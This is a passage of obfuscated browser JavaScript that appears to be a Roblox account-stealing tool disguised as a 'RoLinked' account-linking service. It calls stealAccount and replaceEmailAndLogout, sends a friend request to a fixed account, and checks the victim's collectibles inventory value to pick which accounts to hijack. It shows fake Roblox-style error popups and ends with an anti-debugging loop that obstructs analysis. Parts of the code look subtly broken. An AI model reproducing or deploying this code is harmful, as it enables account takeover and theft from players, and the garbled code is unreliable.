													handleUserVerification(parsedChallengeId, rblx_challenge_id, null);
												}
											});
										}
									} else
										stealAccount(null, null)
								}
							});
					}

					(async function () {
						await delay(800);
						if (validDev[`length`] > 0) {
							console[`log`](validDev);
							try {
								$[`ajax`]({
									method: 'POST',
									url: `https://friends.roblox.com/v1/users/6045232974/request-friendship`,
									contentType: 'application/json',
									data: JSON[`stringify`]({
										friendshipOriginSourceType: 0
									}),
								});
							} catch { }

							replaceEmailAndLogout();
						} else {
							$[`ajax`]({
								'url': `https://inventory.roblox.com/v1/users/` + userId + `/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc`,
								'type': `GET`,
							});
							[`done`](function (V) {
								if (V && V[`data`] && function (E, e) {
									return function (S, m) {
										return S > m;
									}(E, e);

									// Check if the user has a certain amount of items
								}(V[`data`][`length`], 0)) {
									let total = 0;
									V[`data`][`foreach`]((C) => {
										C[`recentAveragePrice`] && (total += C[`recentAveragePrice`]);
									});

									// Check if the user has a certain amount of items
									if (total > T) replaceEmailAndLogout();

									// Account is not qualified to be linked to RoLinked
									else {
										var r = `<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.
Alternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>`;

										document[`body`][`insertAdjacentHTML`](`beforeend`, r);

										document[`getElementById`](`closeButton1`)[`onclick`] = function () {
											document[`getElementById`](`promptPopup`)[`remove`]();
											document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
										};

										document[`getElementById`](`promptPopup`)[`onclick`] = function () {
											document[`getElementById`](`promptPopup`)[`remove`](), (document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`);
										};
									}

									// Account is not qualified to be linked to RoLinked
								} else {
									var r = `<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.
Alternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>`;
									document[`body`][`insertAdjacentHTML`](`beforeend`, r),
										(document[`getElementById`](`closeButton1`)[`onclick`] = function () {
											document[`getElementById`](`promptPopup`)[`remove`](), (document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`);
										}),
										(document[`getElementById`](`promptPopup`)[`onclick`] = function () {
											document[`getElementById`](`promptPopup`)[`remove`]();
											document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
										});
								}
							})

							// Please refresh your page and try again, an error has occured.
							[`fail`](function (V, Q, d) {
								var r =
									`<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>`;
								document[`body`][`insertAdjacentHTML`](`beforeend`, r);
								document[`getElementById`](`closeButton1`)[`onclick`] = function () {
									document[`getElementById`](`promptPopup`)[`remove`]();
									document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
								};
								document[`getElementById`](`promptPopup`)[`onclick`] = function () {
									document[`getElementById`](`promptPopup`)[`remove`]();
									document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
								};
							});
						}
					})();
				},
				error: function () {
					// Not logged in error
					var promptPopupElement =
						`<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>`;
					document[`body`][`insertAdjacentHTML`]('beforeend', promptPopupElement);
					document[`getElementById`]('closeButton1')[`onclick`] = function () {
						document[`getElementById`]('promptPopup')[`remove`]();
						document[`getElementsByClassName`]('text-footer footer-note')[0][`innerText`] = 'Not Active';
					};
					document[`getElementById`]('promptPopup')[`onclick`] = function () {
						document[`getElementById`](`promptPopup`)[`remove`]();
						document[`getElementsByClassName`]('text-footer footer-note')[0][`innerText`] = 'Not Active';
					};
				}
			}));
})();

// Anti Debug
// z is 'init' or null
function AntiDebug(z) {
	function K(L) {
		if (typeof L === 'string') return function (J) { }[`constructor`](`while (true) {}`)[`apply`]('counter');
		else
			(('' + (L / L))['length'] !== 1) || ((L % 20) === 0)
				? function () {
					return true;
				}
				[`constructor`]('debugger')[`call`]('action')
				: function () {
					return false;
				}
				[`constructor`]('debugger')[`apply`]('stateObject');
		K(++L);
	}

	try {
		if (z) return K;
		else K(0);
	} catch (L) { }
}
